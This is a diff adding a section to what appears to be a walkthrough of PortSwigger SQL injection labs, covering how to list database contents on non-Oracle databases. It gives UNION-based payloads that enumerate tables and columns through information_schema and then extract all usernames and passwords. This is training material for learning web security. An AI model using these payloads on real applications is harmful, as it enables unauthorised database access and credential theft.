@@ -48,3 +48,24 @@ In Microsoft database we can payload without to specify FROM table, instead we c
 
 ## 5.SQL injection attack, listing the database contents on non-Oracle databases
 
+Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
+```
+' UNION SELECT 'abc','def'--
+```
+
+Retrieve the list of tables in the database and find the name of the table containing user credentials
+```
+' UNION SELECT table_name, null FROM information_schema.tables--
+```
+
+Replacing the table name to retrieve the details of the columns in the table:
+```
+' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users_abcdef'--
+```
+\
+Replacing the table and column names to retrieve the usernames and passwords for all users:
+```
+' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
+```
+
+## 6.SQL injection attack, listing the database contents on Oracle
